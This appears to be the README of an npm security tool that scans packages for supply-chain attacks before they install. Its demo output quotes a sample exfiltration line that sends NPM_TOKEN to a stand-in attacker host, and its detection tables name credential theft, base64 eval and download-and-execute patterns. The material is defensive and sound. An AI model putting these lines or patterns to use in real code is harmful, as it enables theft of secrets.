<div align="center">

<br/>

```
 ██████╗██╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
██╔════╝██║██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
██║     ██║██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝
██║     ██║██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝
╚██████╗██║╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║
 ╚═════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝

          ███╗   ██╗██████╗ ███╗   ███╗
          ████╗  ██║██╔══██╗████╗ ████║
█████╗    ██╔██╗ ██║██████╔╝██╔████╔██║
╚════╝    ██║╚██╗██║██╔═══╝ ██║╚██╔╝██║
          ██║ ╚████║██║     ██║ ╚═╝ ██║
          ╚═╝  ╚═══╝╚═╝     ╚═╝     ╚═╝
```

### A quarantine layer for npm installs. Catches supply chain attacks before they catch you.

[![npm version](https://img.shields.io/npm/v/cicurity?color=crimson&style=flat-square)](https://www.npmjs.com/package/cicurity)
[![zero dependencies](https://img.shields.io/badge/dependencies-0-brightgreen?style=flat-square)](https://github.com/bobbyjohansen/cicurity-npm/blob/main/package.json)
[![license](https://img.shields.io/github/license/bobbyjohansen/cicurity-npm?style=flat-square)](LICENSE)
[![node](https://img.shields.io/badge/node-%3E%3D20-blue?style=flat-square)](https://nodejs.org)

<br/>

</div>

---

## The attack you haven't thought about yet

You're careful. You use `npm audit`. You pin your dependencies. You review PRs.

Then someone runs `npm install` and your CI pipeline quietly exfiltrates your `NPM_TOKEN`, `AWS_SECRET_ACCESS_KEY`, and every other secret in your environment - before your code runs, before your tests run, before any security tool can see it.

This is a **postinstall attack**. It runs at install time, with your full permissions, and it's [been happening for years](https://socket.dev/blog/axios-npm-package-compromised):

> *"The malicious postinstall script exfiltrated environment variables to an attacker-controlled server within milliseconds of `npm install` completing."*

**npm audit won't catch it.** It only checks known CVEs. A zero-day compromised package, a typosquatted package, a stolen maintainer account - all invisible to audit.

`cicurity` intercepts the install, quarantines the tarball, and runs it through a static analysis engine before a single byte touches your `node_modules`.

---

## See it in action

```
$ cicurity install express @types/node evil-pkg

cicurity analyzing 3 packages...

  ✓ express@4.21.2                     clean
  ✓ @types/node@22.14.0                clean
  ✗ evil-pkg@2.1.0                     BLOCKED (score: 95/100)
    [CRITICAL] Install script makes network calls
               postinstall → scripts/setup.js:23
               fetch('https://c2.attacker.io/collect?t=' + process.env.NPM_TOKEN)
    [CRITICAL] Reads high-value env var 'NPM_TOKEN' in install script
               postinstall → scripts/setup.js:23
    [CRITICAL] eval(Buffer.from(payload, 'base64').toString()) in install script
               postinstall → scripts/setup.js:47

✗ Installation blocked. 1 package(s) have critical security issues.
  To allowlist: cicurity config allow evil-pkg@2.1.0
```

Your `node_modules` is untouched. Your secrets are safe. The attack never ran.

---

## Install

```bash
npm install -g cicurity
# or
pnpm add -g cicurity
```

That's it. No config required.

---

## Usage

Just prefix your install commands with `cicurity`:

```bash
# Instead of this:
npm install express
pnpm add lodash
npx create-next-app myapp

# Do this:
cicurity install express
cicurity pnpm add lodash
cicurity npx create-next-app myapp
```

Or use the full passthrough form:

```bash
cicurity npm install --save-dev typescript
cicurity npm ci
```

**In CI** (GitHub Actions, CircleCI, etc.), blocked packages automatically fail the build with exit code 1 - no prompts, no questions.

---

## What it detects

cicurity runs a multi-layer analysis pipeline on every package before it installs:

### 🔴 Blocked immediately

| Signal | Why it matters |
|---|---|
| Network calls in postinstall/preinstall | Primary exfiltration vector - `fetch()`, `https.get()`, `axios`, etc. |
| `eval()` / `new Function()` in install scripts | Executing hidden payloads at install time |
| `eval(Buffer.from(x, 'base64'))` | The canonical obfuscation pattern in real-world attacks |
| `process.env` access in install scripts | How CI tokens, AWS keys, and npm auth get stolen |
| `child_process.exec/spawn` in install scripts | Arbitrary shell command execution |
| Integrity mismatch | Downloaded tarball doesn't match registry hash - possible MITM |

### 🟡 Flagged for review

| Signal | Why it matters |
|---|---|
| New maintainer within 30 days of publish | Account takeover precedes most supply chain attacks |
| Typosquatting (edit distance ≤ 2 from top 500 packages) | `1odash`, `expres`, `reacts` |
| Scope hijacking (unscoped package matching `@scope/pkg`) | `babel-core` intercepting `@babel/core` installs |
| Prebuilt binaries (`.node`, `.so`, `.dll`, `.exe`) | Can't be statically analyzed |
| New package, very low downloads | Unknown packages with no community vetting |
| Burst publish after dormancy (3+ versions in 24h, gap >30d) | Account takeover burst-pushing before detection |
| Major version jump (e.g. 1.x to 9.x) | Version bump squatting to win semver range resolution |
| `repository` field removed vs previous version | Metadata scrubbing after account takeover |
| New lifecycle hook added vs previous version | Postinstall injected by attacker post-compromise |
| Package name matches internal naming patterns | Dependency confusion attack targeting private registries |

### New in this release

| Signal | Level | Rationale |
|---|---|---|
| `fs.readFile/writeFile` in install script | high | Credential file reading or backdoor writing |
| Credential path accessed (`.ssh`, `.aws/credentials`, `.npmrc`) | critical | SSH key / cloud credential theft |
| Shell profile written (`.bashrc`, `.zshrc`, `.profile`) | critical | Persistence - injected into every shell start |
| CI env var check guarding payload (`process.env.CI`) | high | Targeted CI attack, evades local testing |
| `curl`/`wget` piped to `bash`/`node` via child_process | critical | Second-stage payload download bypassing tarball analysis |
| PowerShell `-EncodedCommand` in exec call | critical | Windows download-and-execute via encoded payload |
| Burst publish after long gap | high | Account takeover burst-push signal |
| Resurrection after 6+ months dormancy | medium | Dormant package re-registered or account compromised |
| `scripts.postinstall` added where none existed before | critical | New lifecycle hook injection |
| `repository` field removed vs previous version | high | Metadata scrubbing post-compromise |
| Author changed between versions | high | Account takeover signal |
| Dependency confusion: internal-looking name on public registry | high | Targeting private registry package names |

---

## The zero-dependency guarantee

Here's the thing about a supply chain security tool: it can't have a supply chain.

```json
"dependencies": {}
```

Every other security tool in this space - linters, scanners, proxies - ships with hundreds of transitive dependencies, each one a potential attack vector. cicurity ships with **zero**. Everything needed at runtime is either a Node.js built-in or vendored directly into the repository:

- **AST parsing** → vendored [acorn](https://github.com/acornjs/acorn) (MIT, zero deps, the parser used inside Node.js itself)
- **Tarball extraction** → custom implementation using `node:zlib` + tar header spec
- **Terminal colors** → inline ANSI escape codes
- **Interactive prompts** → `node:readline`
- **Config validation** → manual schema validation

This is intentional and non-negotiable.

---

## Configuration

Create `cicurity.config.json` in your project root:

```json
{
  "allowlist": [
    "node-gyp@*",
    "esbuild@0.25.1"
  ],
  "blockOn": ["critical", "high"],
  "ci": {
    "warnAction": "block",
    "outputFormat": "text"
  },
  "registry": "https://registry.npmjs.org"
}
```

| Option | Default | Description |
|---|---|---|
| `allowlist` | `[]` | Skip analysis for these packages. Supports `name@version` and `name@*`. |
| `blockOn` | `["critical", "high"]` | Which severity levels trigger a block. |
| `ci.warnAction` | `"block"` | What to do with `warn`-level packages in CI (`block`, `warn`, or `allow`). |
| `ci.outputFormat` | `"text"` | Use `"json"` for machine-readable CI output. |
| `registry` | npmjs.org | Alternate registry URL. |

Config is searched upward from `cwd` to `~/.cicurity/config.json`.

---

## CI integration

### GitHub Actions

With npm:
```yaml
- name: Install dependencies (secure)
  run: |
    npm install -g cicurity
    cicurity npm ci
```

With pnpm:
```yaml
- name: Install dependencies (secure)
  run: |
    npm install -g cicurity
    cicurity pnpm install --frozen-lockfile
```

On a blocked package, the step fails with exit code 1 and prints a detailed report to stderr.

### JSON output for parseable results

```bash
cicurity --json install express > results.json
```

```json
{
  "blocked": 0,
  "warned": 0,
  "clean": 1,
  "packages": [
    {
      "name": "express",
      "version": "4.21.2",
      "action": "allow",
      "score": 0,
      "findings": []
    }
  ]
}
```

---

## How it works

```
cicurity install express
        │
        ▼
  Resolve package         → GET registry.npmjs.org/express (latest version)
        │
        ▼
  Download tarball        → ~/.cicurity/cache/<sha512>.tgz (content-addressed)
        │
        ▼
  Verify integrity        → sha512 must match registry metadata
        │
        ▼
  Extract to temp dir     → /tmp/cicurity-<uuid>/
        │
        ▼
  Run analysis pipeline   → all analyzers run in parallel
  ├── Install scripts      → find postinstall/preinstall hooks
  ├── Network calls        → AST traversal for http/https/fetch
  ├── Obfuscation          → eval, Buffer.from base64, high-entropy strings
  ├── Env access           → process.env in install scripts
  ├── Child process        → exec/spawn in install scripts
  ├── Binary files         → .node/.so/.dll + magic byte detection
  ├── Typosquatting        → Levenshtein vs top-500 npm packages
  ├── Maintainer changes   → new maintainers vs previous version
  └── Package age          → age + download count heuristics
        │
        ▼
  Score findings           → 0-100, block/warn/allow
        │
        ▼
  Allow → run npm install  |  Block → exit 1, print report
        │
        ▼
  Clean up temp dir
```

---

## FAQ

**Does this slow down my installs?**

Yes, slightly. Analysis typically adds 1–3 seconds per unique package (subsequent installs of the same version hit the cache instantly). For most teams, that's a worthwhile tradeoff for not having your CI secrets stolen.

**Does it work with pnpm workspaces / monorepos?**

Yes. Use `cicurity pnpm install` at the workspace root or `cicurity pnpm add <pkg>` in any workspace package.

**Can I use it as a library?**

```typescript
import { analyzePackage, resolvePackage } from 'cicurity';

const resolved = await resolvePackage('some-package@1.0.0');
const result = await analyzePackage(resolved);

if (result.action === 'block') {
  console.log('Blocked:', result.findings);
}
```

**What about private registries?**

Set `"registry": "https://your-registry.example.com"` in `cicurity.config.json`. cicurity will proxy all requests through your configured registry.

**I have a false positive - a legitimate package is being blocked.**

Add it to your `allowlist`. If you believe it's a genuine false positive that should be tuned, [open an issue](https://github.com/bobbyjohansen/cicurity-npm/issues).

---

## Real attacks this would have caught

| Attack | Year | How cicurity stops it |
|---|---|---|
| [event-stream](https://github.com/dominictarr/event-stream/issues/116) | 2018 | Detects network call + eval obfuscation in postinstall |
| [ua-parser-js](https://github.com/faisalman/ua-parser-js/issues/536) | 2021 | Detects `child_process.exec` in postinstall |
| [node-ipc sabotage](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/) | 2022 | Detects filesystem write + new maintainer |
| [axios compromise](https://socket.dev/blog/axios-npm-package-compromised) | 2026 | Detects exfiltration via fetch + process.env access |

---

## Contributing

cicurity has one hard rule: **`"dependencies"` stays empty**. If your change requires a runtime npm package, it needs to be vendored into `src/vendor/` or implemented inline in `src/internal/`.

```bash
git clone https://github.com/bobbyjohansen/cicurity-npm
cd cicurity-npm
npm install          # or: pnpm install
npm run build        # tsc + copy vendor → dist/
npm test             # compile + node:test
npm run lint:no-deps # verify zero runtime dependencies
```

---

## License

MIT © Bobby Johansen

---

<div align="center">

**If cicurity saved your secrets, give it a ⭐**

*Because the next `npm install` might be the one.*

</div>
